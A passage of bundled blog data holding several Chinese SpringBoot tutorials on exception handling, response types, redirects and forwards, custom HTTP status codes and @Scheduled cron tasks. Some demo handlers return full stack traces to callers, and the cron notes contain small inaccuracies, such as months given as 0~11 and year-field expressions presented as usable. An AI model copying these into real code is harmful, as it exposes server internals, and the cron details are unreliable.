29 30 31 32 在上面的测试中，我们将异常堆栈返回调用方 \n 示例服务 \n 增加几个测试方法 \n @Controller \n @RequestMapping ( path  =   "page" ) \n public   class   ErrorPageRest   { \n\n     @ResponseBody \n     @GetMapping ( path  =   "divide" ) \n     public   int   divide ( int  sub )   { \n         return   1000   /  sub ; \n     } \n\n     private   int [ ]  ans  =   new   int [ ] { 1 ,   2 ,   3 ,   4 } ; \n\n     @ResponseBody \n     @GetMapping ( path  =   "ary" ) \n     public   int   ary ( int  index )   { \n         return  ans [ index ] ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #  测试说明 \n 实例测试如下，上面我们声明捕获的两种异常被拦截并输出对应的堆栈信息； \n 但是需要注意 \n \n 404和未捕获的500异常则显示的SpringBoot默认的错误页面； \n 此外我们捕获返回的http状态码是200 \n \n \n @ResponseStatus \n上面的case中捕获的异常返回的状态码是200，但是在某些case中，可能更希望返回更合适的http状态码，此时可以使用ResponseStatus来指定 \n \n 使用方式比较简单，加一个注解即可 \n @ResponseBody \n @ExceptionHandler ( value  =   ArithmeticException . class ) \n @ResponseStatus ( HttpStatus . INTERNAL_SERVER_ERROR ) \n public   String   handleArithmetic ( HttpServletRequest  request ,   HttpServletResponse  response ,   ArithmeticException  e ) \n         throws   IOException   { \n    log . info ( "divide error!" ) ; \n     return   "divide 0: "   +   getThrowableStackInfo ( e ) ; \n } \n \n 1 2 3 4 5 6 7 8 \n 404处理\n通过 @ControllerAdvice 配合 @ExceptionHandler 可以拦截500异常，如果我希望404异常也可以拦截，可以如何处理？ \n \n 首先修改配置文件application.properties，将NoHandlerFoundException抛出来 \n出现错误时, 直接抛出异常 \nspring.mvc.throw - exception - if - no - handler - found=true\n设置静态资源映射访问路径，下面两个二选一， \nspring.mvc.static - path - pattern=/statics/ ** \nspring.resources.add-mappings=false \n \n 1 2 3 4 5 其次是定义异常捕获 \n @ResponseBody \n @ExceptionHandler ( value  =   NoHandlerFoundException . class ) \n @ResponseStatus ( HttpStatus . NOT_FOUND ) \n public   String   handleNoHandlerError ( NoHandlerFoundException  e ,   HttpServletResponse  response )   { \n     return   "noHandlerFound: "   +   getThrowableStackInfo ( e ) ; \n } \n \n 1 2 3 4 5 6 #  项目源码 \n 项目: \n'},{title:"SpringBoot系列: 返回文本、网页、图片",frontmatter:{title:"SpringBoot系列: 返回文本、网页、图片",date:"2021-11-01 22:22:39",tags:["SpringBoot系列","web","response"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springBoot_return_data.html",relativePath:"blogs/springboot/springBoot_return_data.md",key:"v-6f1a2996",path:"/blogs/springboot/springBoot_return_data.html",headers:[{level:2,title:"数据返回姿势实例",slug:"数据返回姿势实例"},{level:2,title:"小结",slug:"小结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 前面几篇博文介绍了如何获取get/post传参，既然是http请求，一般也都是有来有往，有请求参数传递，就会有数据返回。那么我们通过springboot搭建的web应用，可以怎样返回数据呢？ \n 本篇将主要介绍以下几种数据格式的返回实例 \n \n 返回文本 \n 返回数组 \n 返回json串 \n 返回静态网页 \n 返回图片 \n 数据返回姿势实例 \n 以下返回实例都放在同一个Controller中，具体定义如下 \n @Controller \n @RequestMapping ( path  =   "data" ) \n public   class   DataRespRest   { \n } \n \n 1 2 3 4 \n 文本返回\n这个属于基础功能了，发起请求，返回一串文本，在SpringMVC的体系中，要实现这种通常的写法通常是直接定义方法的返回为String；当然还有另外一种非常基础的写法，直接将返回的数据通过HttpServletResponse写入到输出流中 \n \n 下面给出这两种写法的实例 \n @ResponseBody \n @GetMapping ( path  =   "str" ) \n public   String   strRsp ( )   { \n     return   "hello "   +  UUID . randomUUID ( ) . toString ( ) ; \n } \n\n @ResponseBody \n @GetMapping ( path  =   "str2" ) \n public   void   strRsp2 ( HttpServletResponse  response )   throws   IOException   { \n     Map < String ,   String >  ans  =   new   HashMap < > ( 2 ) ; \n    ans . put ( "a" ,   "b" ) ; \n    ans . put ( "b" ,   "c" ) ; \n    response . getOutputStream ( ) . write ( JSON . toJSONString ( ans ) . getBytes ( ) ) ; \n    response . getOutputStream ( ) . flush ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 注意上面的实现中，方法上面多了一个注解 @ResponseBody ，这个表示返回数据，而不是视图（后面会详细说明） \n strRsp2的输出借助了FastJson来实现将map序列化为json串，然后写入输出流 \n 从上面的输出也可以看出，第一种返回方式，ResponseHeaders的Content-Type: text/html;charset=UTF-8；而第二种方式则没有这个响应头，需要我们自己主动设置（这里注意一下即可，在后面的返回图片中有实例） \n \n 返回数组\n前面请求参数的博文中，我们看到请求参数允许传入数组，那么我们返回可以直接返回数组么？讲道理的话，应该没啥问题 \n \n /**\n * 返回数组\n *\n * @return\n */ \n @ResponseBody \n @GetMapping ( path  =   "ary" ) \n public   String [ ]   aryRsp ( )   { \n     return   new   String [ ] { UUID . randomUUID ( ) . toString ( ) ,   LocalDateTime . now ( ) . toString ( ) } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 注意下响应头，为 application/json , 也就是说SpringMVC将数组当成json串进行返回了 \n \n Bean返回\n在我们实际的业务开发中，这种应该属于非常常见的使用姿势了，直接返回一个POJO，调用者接收的是一个json串，可以很容易的反序列化为需要的对象 \n \n /**\n * 返回POJO\n *\n * @return\n */ \n @ResponseBody \n @GetMapping ( path  =   "bean" ) \n public   DemoRsp   beanRsp ( )   { \n     return   new   DemoRsp ( 200 ,   "success" ,  UUID . randomUUID ( ) . toString ( )   +   "---\x3edata" ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 \n 网页返回\n前面都是直接返回数据，但是我们平常在使用浏览器，更多的是发起一个请求，然后返回一个网页啊，难道说springmvc不能直接返回网页么？ \n \n 当然返回网页怎么可能会不支持，（题外话：个人感觉在前后端分离逐渐流行之后，直接由后端返回网页的case不太多了，前端和后端作为独立的项目部署，两者之间通过json串进行交流；这里扯远了），我们下面看一下SpringMVC中如何返回网页 \n 我们可以从上面直接返回字符串的case中，得到一个思路，如果我直接返回一个html文本，会怎样？既然返回content-type是text/html，那浏览器应该可以解析为网页的，下面实测一下 \n @ResponseBody \n @GetMapping ( path  =   "html" ) \n public   String   strHtmlRsp ( )   { \n     return   "<html>\\n"   +   "<head>\\n"   +   "    <title>返回数据测试</title>\\n"   +   "</head>\\n"   +   "<body>\\n"   + \n             "<h1>欢迎欢迎，热烈欢迎</h1>\\n"   +   "</body>\\n"   +   "</html>" ; \n } \n \n 1 2 3 4 5 6 浏览器发起请求之后，将我们返回的html文本当做网页正常渲染了，所以我们如果想返回网页，就这么干，没毛病！\n上面这种方式虽然说可以返回网页，然而在实际业务中，如果真要我们这么干，想想也是可怕，还干什么后端，分分钟全栈得了！！！\n下面看一下更常规的写法，首先我们需要配置下返回视图的前缀、后缀, 在application.yml配置文件中添加如下配置 \n spring : \n   mvc : \n     view : \n       prefix :  /\n       suffix :  .html\n \n 1 2 3 4 5 然后我们的静态网页，放在资源文件的static目录下，下面是我们实际的项目截图，index.html为我们需要返回的静态网页 \n 接下来就是我们的服务接口 \n /**\n * 返回视图\n *\n * @return\n */ \n @GetMapping ( path  =   "view" ) \n public   String   viewRsp ( )   { \n     return   "index" ; \n } \n \n 1 2 3 4 5 6 7 8 9 注意下上面的接口，没有@ResponseBody注解，表示这个接口返回的是一个视图，会从static目录下寻找名为index.html（前缀路径和后缀是上面的application.yml中定义）的网页返回 \n \n 图片返回\n图片返回与前面的又不太一样了，上面介绍的几种case中，要么是返回文本，要么返回视图，而返回图片呢，更多的是返回图片的字符数组，然后告诉浏览器这是个图片，老哥你按照图片渲染 \n \n 直接返回二进制流，上面在介绍文本返回的两种方式中，有个直接通过HttpServletResponse向输出流中写数据的方式，我们这里是不是可以直接这么用呢？ \n 下面给出一个从网络下载图片并返回二进制流的实际case \n /**\n * 返回图片\n */ \n @GetMapping ( path  =   "img" ) \n public   void   imgRsp ( HttpServletResponse  response )   throws   IOException   { \n    response . setContentType ( "image/png" ) ; \n     ServletOutputStream  outStream  =  response . getOutputStream ( ) ; \n\n     String  path  =   "https://spring.hhui.top/spring-blog/imgs/info/info.png" ; \n     URL  uri  =   new   URL ( path ) ; \n     BufferedImage  img  =   ImageIO . read ( uri ) ; \n     ImageIO . write ( img ,   "png" ,  response . getOutputStream ( ) ) ; \n     System . out . println ( "--------" ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 注意下上面的实例case，首先设置了返回的ContentType，然后借助ImateIO来下载图片（个人不太建议这种写法，很容易出现403；这里演示主要是为了简单…），并将图片写入到输出流 \n 小结 \n \n 返回数据小结\n本篇博文主要介绍了几种常见数据格式的返回使用姿势，本文更多的是一种使用方式的实例case演示，并没有涉及到底层的支持原理，也没有过多的提及如何设置响应头，web交互中常见的cookies/session也没有说到，这些将作为下篇的内容引入，恳请关注 \n \n 下面做一个简单的小结 \n \n 返回纯数据 \n \n \n 添加 @ResponseBody 注解，则表示我们返回的是数据，而不需要进行视图解析渲染； \n 如果一个 controller 中全部都是返回数据，不会返回视图时，我们可以在添加 @RestController 注解，然后这个类中的接口都不需要添加@ResponseBody注解了 \n 返回视图时，我们会根据接口返回的字符串，结合定义的前缀，后缀，到资源路径的 static 目录下寻找对应的静态文件返回 \n 可以直接通过向 HttpServletResponse 的输出流中写数据的方式来返回数据，如返回图片常用这种case \n \n'},{title:"SpringBoot系列: url重定向和转发",frontmatter:{title:"SpringBoot系列: url重定向和转发",date:"2021-10-31 19:12:37",tags:["SpringBoot系列","redirect","forward"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springBoot_redirect_and_forward.html",relativePath:"blogs/springboot/springBoot_redirect_and_forward.md",key:"v-16db1b71",path:"/blogs/springboot/springBoot_redirect_and_forward.html",headers:[{level:2,title:"定义",slug:"定义"},{level:3,title:"请求转发",slug:"请求转发"},{level:3,title:"举例说明",slug:"举例说明"},{level:3,title:"重定向",slug:"重定向"},{level:3,title:"举例说明",slug:"举例说明-2"},{level:2,title:"redirect 和 forward的区别:",slug:"redirect-和-forward的区别"},{level:2,title:"转发和重定向的选择",slug:"转发和重定向的选择"},{level:2,title:"实现方式",slug:"实现方式"},{level:3,title:"转发 forward",slug:"转发-forward"},{level:3,title:"重定向 redirect",slug:"重定向-redirect"},{level:2,title:"项目源码",slug:"项目源码"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Web UI项目中, 很多 Spring controller 视图函数直接返回 html 页面, 还有一些视图函数是要重定向或转发到其他的 url 上. \n 定义 \n 请求转发 \n 浏览器向服务器发起仅一次请求、\n服务器可以多次转发这个请求，寻找同一web程序下的资源\n然后将结果返回给浏览器 \n 举例说明 \n 劫匪朝要张三100W（request），\n不管他是朝几个人、怎么借的、（内部多次转发）\n打钱给劫匪（response）\n但张三只能是朝自己认识的人借钱（调用你认识的人、内部资源） \n 重定向 \n 浏览器想服务器发起第1次请求\n服务器返回第1个结果一个url和状态码302\n然后浏览器发起第2次请求\n使用服务器返回的url、这次请求的范围甚至可以是其余站外的资源\n访问这个url会导致地址栏的url的改变\n然后服务器返回第2个结果到浏览器 \n 举例说明 \n 你来问一个熟人问题（request-1）\n熟人说不会（response-1）让你去度娘问（url）\n你去度娘问网友（调用非熟人的资源、request）\n得到了答案（response） \n redirect 和 forward的区别: \n \n 重定向 redirect: 完整的重定向包含两次request-response过程, 第一次是访问原始url, 第二次是服务器通知客户端访问重定向后的url. 重定向完成后, 浏览器的地址是重定向后的url, 而不是原始的url. \n \n 重定向的使用场景: 因为重定向会修改浏览器地址, 所以 form 提交应该使用重定向, 以免用户刷新页面导致form重复提交。 \n 比如我们在逛淘宝，没有登录就点击购买时，会跳转到登录界面，这其实就是一个重定向。本文主要介绍对于后端而言，可以怎样支持302重定向。 \n 转发 forward: 完整的转发仅包含一次 request-response 过程, 用户发出request后, 服务器端视图函数先处理自己的逻辑, 然后在服务器端有调用另一个视图函数, 最后将response返回给浏览器. \n 请求转发的挑战、为同一业务功能服务\n重定向偏向于、不同业务功能之间的跳转 \n 另外请求转发与重定向明显的一个区别就是：\n如果应该使用重定向的地方、\n使用请求转发会有重复操作的隐患 \n 转发和重定向的选择 \n \n 重定向的速度比转发慢，因为浏览器还得发出一个新的请求，如果在使用转发和重定向都无所谓的时候建议使用转发。 \n 因为转发只能访问当前WEB的应用程序，所以不同WEB应用程序之间的访问，特别是要访问到另外一个WEB站点上的资源的情况，这个时候就只能使用重定向了。 \n 实现方式 \n 转发 forward \n 在Spring MVC 中, 构建forward 目标有两种方式: \n \n 以字符串的形式构建目标url, url 需要加上 forward: 前缀 \n 使用 ModelAndView 对象来设置转发的forward目标, viewName 可以省略 forward: 前缀, viewName 应该是目标url, 而不是目标视图的函数名.\n传参方式: \n 以字符串的形式构建目标url, 可以使用 query variable的格式拼url \n 使用 ModelAndView 对象来增加 attribute Object, 其结果也是在拼接url.\n取参的方式: 可以使用 @RequestParam 来取参. \n 重定向 redirect \n redirect 目标有三种构建方式 \n \n 使用 redirect: 前缀url方式构建目标url \n 使用 HttpServletResponse重定向 \n 使用 RedirectView \n 使用 ModelAndView 类型指定目标, ModelAndView 视图名默认是forward, 所以对于redirect, 需要加上 redirect: 前缀 \n \n 传参和取参方式: \n \n 传参: 以字符串的形式构建目标url, 可以使用 query variable的格式拼url. 取参: @RequestParam()来fetch \n 传参: 可以用 HttpServletRequest.getParameterMap()来fetch \n 传参: redirectAttributes.addAttribute() 加的attr. 取参: @RequestParam()来fetch \n 传参: redirectAttributes.addFlashAttribute() 加的attr. 取参: @ModelAttribute()来fetch \n \n Flash attribute的特点: \n \n addFlashAttribute() 可以是任意类型的数据(不局限在String等基本类型), addAttribute()只能加基本类型的参数. \n addFlashAttribute() 加的 attr, 不会出现在url 地址栏上. \n addFlashAttribute() 加的 attr, 一旦fetch后, 就会自动清空, 非常适合 form 提交后 feedback Message. \n 小结 \n 这里主要介绍了两种常见的后端重定向方式，都比较简单，这两种方式也有自己的适用场景（当然并不绝对） \n \n 在返回视图的前面加上redirect的方式，更加适用于视图的跳转，从一个网页跳转到另一个网页 \n HttpServletResponse#sendRedirec的方式更加灵活，可以在后端接收一次http请求生命周期中的任何一个阶段来使用，比如有以下几种常见的场景 \n \n \n 某个接口要求登录时，在拦截器层针对所有未登录的请求，重定向到登录页面 \n 全局异常处理中，如果出现服务器异常，重定向到定制的500页面 \n 不支持的请求，重定向到404页面 \n 项目源码 \n 项目: \n"},{title:"SpringBoot系列: 自定义返回Http Code的n种姿势",frontmatter:{title:"SpringBoot系列: 自定义返回Http Code的n种姿势",date:"2021-11-01 21:22:39",tags:["SpringBoot系列","web"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springBoot_return_http_code.html",relativePath:"blogs/springboot/springBoot_return_http_code.md",key:"v-3d50358a",path:"/blogs/springboot/springBoot_return_http_code.html",headers:[{level:2,title:"ResponseStatus使用",slug:"responsestatus使用"},{level:3,title:"装饰方法",slug:"装饰方法"},{level:3,title:"装饰异常类",slug:"装饰异常类"},{level:3,title:"注意",slug:"注意"},{level:2,title:"ResponseEntity",slug:"responseentity"},{level:2,title:"HttpServletResponse",slug:"httpservletresponse"},{level:3,title:"setStatus",slug:"setstatus"},{level:3,title:"sendError",slug:"senderror"},{level:2,title:"小结",slug:"小结"},{level:3,title:"ResponseStatus",slug:"responsestatus"},{level:3,title:"ResponseEntity",slug:"responseentity-2"},{level:3,title:"HttpServletResponse",slug:"httpservletresponse-2"},{level:2,title:"项目源码",slug:"项目源码"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' W虽然http的提供了一整套完整、定义明确的状态码，但实际的业务支持中，后端并不总会遵守这套规则，更多的是在返回结果中，加一个code字段来自定义业务状态，即便是后端5xx了，返回给前端的http code依然是200 \n 那么如果我想遵守http的规范，不同的case返回不同的http code在Spring中可以做呢? \n 本文将介绍四种设置返回的HTTP CODE的方式 \n \n @ResponseStatus 注解方式 \n ResponseEntity \n HttpServletResponse#setStatus \n HttpServletResponse#sendError \n ResponseStatus使用 \n 通过注解 @ResponseStatus ，来指定返回的http code, 一般来说，使用它有两种姿势，一个是直接加在方法上，一个是加在异常类上 \n 装饰方法 \n 直接在方法上添加注解，并制定对应的code \n /**\n * 注解方式，只支持标准http状态码\n *\n * @return\n */ \n @GetMapping ( "ano" ) \n @ResponseStatus ( code  =   HttpStatus . BAD_REQUEST ,  reason  =   "请求参数异常!" ) \n public   String   ano ( )   { \n     return   "{\\"code\\": 400, \\"msg\\": \\"bad request!\\"}" ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 实测一下，返回结果如下 \n curl   \'http://127.0.0.1:8080/code/ano\'  -i\nHTTP/1.1  400 \nContent-Type: application/json ; charset = UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 05 Jan  2020  01:29:04 GMT\nConnection: close\n\n { "timestamp" : "2020-01-05T01:29:04.673+0000" , "status" :400, "error" : "Bad Request" , "message" : "请求参数异常!" , "path" : "/code/ano" } \n \n 1 2 3 4 5 6 7 8 当我们发起请求时，返回的状态码为400，返回的数据为springboot默认的错误信息格式 \n 虽然上面这种使用姿势可以设置http code，但是这种使用姿势有什么意义呢？ \n 如果看过web系列教程中的： SpringBoot系列教程web篇之全局异常处理  可能就会有一些映象，配合 @ExceptionHandler 来根据异常返回对应的状态码 \n 一个推荐的使用姿势，下面表示当你的业务逻辑中出现数组越界时，返回500的状态码以及完整的堆栈信息 \n @ResponseBody \n @ExceptionHandler ( value  =   ArrayIndexOutOfBoundsException . class ) \n @ResponseStatus ( HttpStatus . INTERNAL_SERVER_ERROR ) \n public   String   handleArrayIndexOutBounds ( HttpServletRequest  request ,   HttpServletResponse  response , \n         ArrayIndexOutOfBoundsException  e )   throws   IOException   { \n    log . info ( "array index out conf!" ) ; \n     return   "aryIndexOutOfBounds: "   +   getThrowableStackInfo ( e ) ; \n } \n \n 1 2 3 4 5 6 7 8 #  装饰异常类 \n 另外一种使用姿势就是直接装饰在异常类上，然后当你的业务代码中，抛出特定的异常类，返回的httpcode就会设置为注解中的值 \n /**\n * 异常类 + 注解方式，只支持标准http状态码\n *\n * @return\n */ \n @GetMapping ( "exception/500" ) \n public   String   serverException ( )   { \n     throw   new   ServerException ( "内部异常哦" ) ; \n } \n\n @GetMapping ( "exception/400" ) \n public   String   clientException ( )   { \n     throw   new   ClientException ( "客户端异常哦" ) ; \n } \n\n @ResponseStatus ( code  =   HttpStatus . INTERNAL_SERVER_ERROR ,  reason  =   "服务器失联了，请到月球上呼叫试试~~" ) \n public   static   class   ServerException   extends   RuntimeException   { \n     public   ServerException ( String  message )   { \n         super ( message ) ; \n     } \n } \n\n @ResponseStatus ( code  =   HttpStatus . BAD_REQUEST ,  reason  =   "老哥，你的请求有问题~~" ) \n public   static   class   ClientException   extends   RuntimeException   { \n     public   ClientException ( String  message )   { \n         super ( message ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 测试结果如下，在异常类上添加注解的方式，优点在于不需要配合@ExceptionHandler写额外的逻辑了；缺点则在于需要定义很多的自定义异常类型 \n curl   \'http://127.0.0.1:8080/code/exception/400\'  -i\nHTTP/1.1  400 \nContent-Type: application/json ; charset = UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 05 Jan  2020  01:37:07 GMT\nConnection: close\n\n { "timestamp" : "2020-01-05T01:37:07.662+0000" , "status" :400, "error" : "Bad Request" , "message" : "老哥，你的请求有问题~~" , "path" : "/code/exception/400" } %\n\n➜  ~  curl   \'http://127.0.0.1:8080/code/exception/500\'  -i\nHTTP/1.1  500 \nContent-Type: application/json ; charset = UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 05 Jan  2020  01:37:09 GMT\nConnection: close\n\n { "timestamp" : "2020-01-05T01:37:09.389+0000" , "status" :500, "error" : "Internal Server Error" , "message" : "服务器失联了，请到月球上呼叫试试~~" , "path" : "/code/exception/500" } \n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #  注意 \n ResponseStatus注解的使用姿势，只支持标准的Http Code（必须是枚举类org.springframework.http.HttpStatus） \n ResponseEntity \n 这种使用姿势就比较简单了，方法的返回结果必须是ResponseEntity，下面给出两个实际的case \n @GetMapping ( "401" ) \n public   ResponseEntity < String >   _401 ( )   { \n     return   ResponseEntity . status ( HttpStatus . UNAUTHORIZED ) . body ( "{\\"code\\": 401, \\"msg\\": \\"未授权!\\"}" ) ; \n } \n\n @GetMapping ( "451" ) \n public   ResponseEntity < String >   _451 ( )   { \n     return   ResponseEntity . status ( 451 ) . body ( "{\\"code\\": 451, \\"msg\\": \\"自定义异常!\\"}" ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 实测结果 \n curl   \'http://127.0.0.1:8080/code/401\'  -i\nHTTP/1.1  401 \nContent-Type: text/plain ; charset = UTF-8\nContent-Length:  34 \nDate: Sun, 05 Jan  2020  01:40:10 GMT\n\n { "code" :   401 ,  "msg" :   "未授权!" } \n\n curl   \'http://127.0.0.1:8080/code/451\'  -i\nHTTP/1.1  451 \nContent-Type: text/plain ; charset = UTF-8\nContent-Length:  40 \nDate: Sun, 05 Jan  2020  01:40:19 GMT\n\n { "code" :   451 ,  "msg" :   "自定义异常!" } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 从上面的使用实例上看，可以知道这种使用方式，不仅仅支持标准的http code，也支持自定义的code（如返回code 451) \n HttpServletResponse \n 这种使用姿势则是直接操作 HttpServletResponse 对象，手动录入返回的结果 \n setStatus \n /**\n * response.setStatus 支持自定义http code，并可以返回结果\n *\n * @param response\n * @return\n */ \n @GetMapping ( "525" ) \n public   String   _525 ( HttpServletResponse  response )   { \n    response . setStatus ( 525 ) ; \n     return   "{\\"code\\": 525, \\"msg\\": \\"自定义错误码 525!\\"}" ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 输出结果 \n curl   \'http://127.0.0.1:8080/code/525\'  -i\nHTTP/1.1  525 \nContent-Type: text/plain ; charset = UTF-8\nContent-Length:  47 \nDate: Sun, 05 Jan  2020  01:45:38 GMT\n\n { "code" :   525 ,  "msg" :   "自定义错误码 525!" } \n \n 1 2 3 4 5 6 7 使用方式比较简单，直接设置status即可，支持自定义的Http Code返回 \n sendError \n 使用这种姿势的时候需要注意一下，只支持标准的http code，而且response body中不会有你的业务返回数据，如 \n /**\n * send error 方式，只支持标准http状态码; 且不会带上返回的结果\n *\n * @param response\n * @return\n * @throws IOException\n */ \n @GetMapping ( "410" ) \n public   String   _410 ( HttpServletResponse  response )   throws   IOException   { \n    response . sendError ( 410 ,   "send 410" ) ; \n     return   "{\\"code\\": 410, \\"msg\\": \\"Gone 410!\\"}" ; \n } \n\n @GetMapping ( "460" ) \n public   String   _460 ( HttpServletResponse  response )   throws   IOException   { \n    response . sendError ( 460 ,   "send 460" ) ; \n     return   "{\\"code\\": 460, \\"msg\\": \\"Gone 460!\\"}" ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 输出结果 \n curl   \'http://127.0.0.1:8080/code/410\'  -i\nHTTP/1.1  410 \nContent-Type: application/json ; charset = UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 05 Jan  2020  01:47:52 GMT\n\n { "timestamp" : "2020-01-05T01:47:52.300+0000" , "status" :410, "error" : "Gone" , "message" : "send 410" , "path" : "/code/410" } \n\n curl   \'http://127.0.0.1:8080/code/460\'  -i\nHTTP/1.1  500 \nContent-Type: application/json ; charset = UTF-8\nTransfer-Encoding: chunked\nDate: Sun, 05 Jan  2020  01:47:54 GMT\nConnection: close\n\n { "timestamp" : "2020-01-05T01:47:54.719+0000" , "status" :460, "error" : "Http Status 460" , "message" : "send 460" , "path" : "/code/460" } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 从上面的case也可以看出，当我们使用send error时，如果是标准的http code，会设置对响应头；如果是自定义的不被识别的code，那么返回的http code是500 \n 小结 \n 上面介绍了几种常见的设置响应http code的姿势，下面小结一下使用时的注意事项 \n ResponseStatus \n \n 只支持标准的http code \n 装饰自定义异常类，使用时抛出对应的异常类，从而达到设置响应code的效果 \n 缺点对非可控的异常类不可用 \n 结合@ExceptionHandler，用来装饰方法 \n ResponseEntity \n 形如： \n return   ResponseEntity . status ( 451 ) . body ( "{\\"code\\": 451, \\"msg\\": \\"自定义异常!\\"}" ) ; \n \n 1 \n 感觉是最强大的使用姿势，就是写起来没有那么简洁 \n 支持自定义code，支持设置 response body \n HttpServletResponse \n \n setStatus: 设置响应code，支持自定义code，支持返回response body \n sendError: 只支持标准的http code，如果传入自定义的code，返回的http code会是500 \n 项目源码 \n 项目: \n'},{title:"SpringBoot之定时任务详解",frontmatter:{title:"SpringBoot之定时任务详解",date:"2021-10-20T23:13:59.000Z",tags:["SpringBoot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_Scheduled.html",relativePath:"blogs/springboot/springboot_Scheduled.md",key:"v-15727ef5",path:"/blogs/springboot/springboot_Scheduled.html",headers:[{level:2,title:"创建定时器",slug:"创建定时器"},{level:2,title:"1、导入依赖包：",slug:"_1、导入依赖包"},{level:2,title:"2、添加数据库记录：",slug:"_2、添加数据库记录"},{level:2,title:"3、创建定时器",slug:"_3、创建定时器"},{level:2,title:"创建多线程定时任务",slug:"创建多线程定时任务"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 序言 \n 使用SpringBoot创建定时任务非常简单，目前主要有以下三种创建方式： \n \n 一、基于注解(@Scheduled) \n 二、基于接口（SchedulingConfigurer） 前者相信大家都很熟悉，但是实际使用中我们往往想从数据库中读取指定时间来动态执行定时任务，这时候基于接口的定时任务就派上用场了。 \n 三、基于注解设定多线程定时任务 \n \n 基于注解@Scheduled默认为单线程，开启多个任务时，任务的执行时机会受上一个任务执行时间的影响。 \n 一、静态：基于注解 \n 创建定时器 \n 使用SpringBoot基于注解来创建定时任务非常简单，只需几行代码便可完成。 代码如下： \n @Configuration        //1.主要用于标记配置类，兼备Component的效果。 \n @EnableScheduling     // 2.开启定时任务 \n public   class   SaticScheduleTask   { \n     //3.添加定时任务 \n     @Scheduled ( cron  =   "0/5 * * * * ?" ) \n     //或直接指定时间间隔，例如：5秒 \n     //@Scheduled(fixedRate=5000) \n     private   void   configureTasks ( )   { \n         System . err . println ( "执行静态定时任务时间: "   +   LocalDateTime . now ( ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 对于 @Scheduled 的使用可以总结如下几种方式： \n \n @Scheduled(fixedRate = 3000) ：上一次开始执行时间点之后 3 秒再执行（fixedRate 属性：定时任务开始后再次执行定时任务的延时（需等待上次定时任务完成），单位毫秒） \n @Scheduled(fixedDelay = 3000) ：上一次执行完毕时间点之后 3 秒再执行（fixedDelay 属性：定时任务执行完成后再次执行定时任务的延时（需等待上次定时任务完成），单位毫秒） \n @Scheduled(initialDelay = 1000, fixedRate = 3000) ：第一次延迟1秒后执行，之后按fixedRate的规则每 3 秒执行一次（initialDelay 属性：第一次执行定时任务的延迟时间，需配合fixedDelay或者fixedRate来使用） \n @Scheduled(cron="0 0 2 1 * ? *") ：通过cron表达式定义规则 \n \n Cron表达式参数分别表示： \n \n 秒（0~59） 例如0/5表示每5秒 \n 分（0~59） \n 时（0~23） \n 日（0~31）的某天，需计算 \n 月（0~11） \n 周几（ 可填1-7 或 SUN/MON/TUE/WED/THU/FRI/SAT） \n \n @Scheduled：除了支持灵活的参数表达式cron之外，还支持简单的延时操作，例如 fixedDelay ，fixedRate 填写相应的毫秒数即可。 \n // Cron表达式范例：\n\n每隔5秒执行一次：*/5 * * * * ?\n\n每隔1分钟执行一次：0 */1 * * * ?\n\n每天23点执行一次：0 0 23 * * ?\n\n每天凌晨1点执行一次：0 0 1 * * ?\n\n每月1号凌晨1点执行一次：0 0 1 1 * ?\n\n每月最后一天23点执行一次：0 0 23 L * ?\n\n每周星期天凌晨1点实行一次：0 0 1 ? * L\n\n在26分、29分、33分执行一次：0 26,29,33 * * * ?\n\n每天的0点、13点、18点、21点都执行一次：0 0 0,13,18,21 * * ?\n\n\n常用的cron表达式有：\n\n0 0 2 1 * ? * ：表示在每月 1 日的凌晨 2 点执行\n0 15 10 ? * MON-FRI ：表示周一到周五每天上午 10:15 执行\n0 15 10 ? 6L 2019-2020 ：表示 2019-2020 年的每个月的最后一个星期五上午 10:15 执行\n0 0 10,14,16 * * ? ：每天上午 10 点，下午 2 点，4 点执行\n0 0/30 9-17 * * ? ：朝九晚五工作时间内每半小时执行\n0 0 12 ? * WED ：表示每个星期三中午 12 点执行\n0 0 12 * * ? ：每天中午 12点执行\n0 15 10 ? * * ：每天上午 10:15 执行\n0 15 10 * * ? ：每天上午 10:15 执行\n0 15 10 * * ? * ：每天上午 10:15 执行\n0 15 10 * * ? 2019 ：2019 年的每天上午 10:15 执行\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #  二、动态：基于接口 \n 基于接口（SchedulingConfigurer） \n 1、导入依赖包： \n < parent > \n         < groupId > org.springframework.boot </ groupId > \n         < artifactId > spring-boot-starter </ artifactId > \n         < version > 2.0.4.RELEASE </ version > \n     </ parent > \n\n     < dependencies > \n         < dependency > \x3c!--添加Web依赖 --\x3e \n             < groupId > org.springframework.boot </ groupId > \n             < artifactId > spring-boot-starter-web </ artifactId > \n         </ dependency > \n         < dependency > \x3c!--添加MySql依赖 --\x3e \n              < 